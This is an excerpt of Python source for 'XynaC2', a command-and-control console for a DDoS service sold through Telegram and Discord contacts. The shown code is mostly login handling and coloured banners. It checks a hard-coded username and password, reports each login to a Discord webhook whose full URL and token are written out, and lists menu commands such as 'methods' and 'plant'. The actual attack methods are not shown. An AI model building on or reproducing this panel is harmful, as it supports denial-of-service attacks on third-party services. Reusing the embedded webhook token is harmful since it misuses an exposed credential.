...
content = "Someone Just Login In XynaC2"

webhook = DiscordWebhook(url="https://canary.discord.com/api/webhooks/1008349093568979004/gc1woBaxmdPNqOepGWKace3UKN3KNRWLduHrd7EK2jM1y3QjxwnfGuaqUQk1PXykySvq", username="XynaC2", content=content)

embed = DiscordEmbed(title=" :satellite: XynaC2 Login Log :satellite:", color=0x2ecc71)

embed.set_timestamp()
embed.set_footer(text="©️ XynaC2")
embed.add_embed_field(name='Welcome To XynaC2', value='User __root__ is Now Logged in!')

webhook.add_embed(embed)
response = webhook.execute()

prot = (random.randint(2,4))
sys.stdout.write("\x1b]2;Xyna C2 |  Online User : [{}] | Username: [-] | Devices : 89 | Expire : [UNLIMITED] \x07".format (prot))
        
os.system("clear")
print("""
\033[93m>> \033[96mWelcome XynaC2 \033[93m<<
\033[93mWanna Buy? DM @dewaaa666 Or You Can DM
\033[93m@plralsme make Sure You Join
\033[93mTo Our Server t.me/xynac2net              
""")
username = str(input("\033[33m[XynaC2] \033[93mUsername:\033[37m"))
password = str(input("\033[33m[XynaC2] \033[93mPassword:\033[37m"))
if password == "root" and username == "naura23":
...
\033[95m║\033[97m 7. Dont Share XynaC2                      \033[95m║
\033[95m╚═══════════════════════════════════════════╝
...
ticket = """\033[96m For Ticket You Can Join Our Discord Server. \033[93mhttps://discord.Xynanet.xyz/"""

banner =  """\033[97m|\033[95mXynaC2\033[97m| \033[91m| VIP ACSESS\033[97m: [\033[92mTRUE\033[97m] |  \033[91mDISCORD\033[97m: [\033[92mItzSeven#3217\033[97m] \033[97m| \033[91mNew Design, Enjoy!~
...
\033[95m                    ▐█ ▪▐▌▐█•█▌▐█▄▄▌▐█▄▪▐█
\033[95m                     ▀  ▀ .▀  ▀ ▀▀▀  ▀▀▀▀ 
\033[95m              \033[91m♥ \033[95mXYNA C2 MADE BY ItzSeven \033[91m♥
\033[95m        ══╦═════════════════════════════════╦══
\033[95m╔═════════╩═════════════════════════════════╩═════════╗
\033[95m║              \033[97mWelcome To XynaC2                      \033[95m║
\033[95m║ \033[97mType "help" \033[97mFor Help . If you wanna buy XynaC2      \033[95m║
\033[95m║ \033[97mContact @dewaaa666 / @plralsme                         \033[95m║
\033[95m╚═══╦════════════════════════════════════════════╦════╝
\033[95m   ╔╩════════════════════════════════════════════╩╗
...
\033[95m   ║ \033[97mCopyrigtht © XynaC2 2022 All Rights Reserved \033[95m║
\033[95m   ╚══════════════════════════════════════════════╝
"""
...
\033[95m         methods              : \033[97mShow All Methods in XynaC2
\033[95m         plant                : \033[97mShow Your Plant
\033[95m         rules                : \033[97mShow Rules
\033[95m    
\033[95m                   \033[93mϟ  \033[97mMade By : Dewaa XD \033[93mϟ 
\033[95m                             
\033[95m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[95m             ╦══╩═════════════════════════════════╩══╦
\033[97m            Copyrigtht © XynaC2 2022 All Rights Reserved
\033[95m             ╩═══════════════════════════════════════╩"""
...
\033[0;96m                              
\033[0;96m =============Dewaaa CREATED THIS DDOS======================"""
...
def main():
    ...
    while True:
        ...
        sys.stdout.write("\x1b]2;Xyna C2 | Online User : [{}] | Username: [root] | Devices : 89 | Expire : [UNLIMITED] \x07".format (powerran))
        sin = input("\033[95m[\033[97mroot@Xyna\033[95m]\033[97m~$ \033[37m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
        ...
        if sinput == "plant":
            ...
            webhook = DiscordWebhook(url="https://canary.discord.com/api/webhooks/1008349093568979004/gc1woBaxmdPNqOepGWKace3UKN3KNRWLduHrd7EK2jM1y3QjxwnfGuaqUQk1PXykySvq", username="XynaC2")
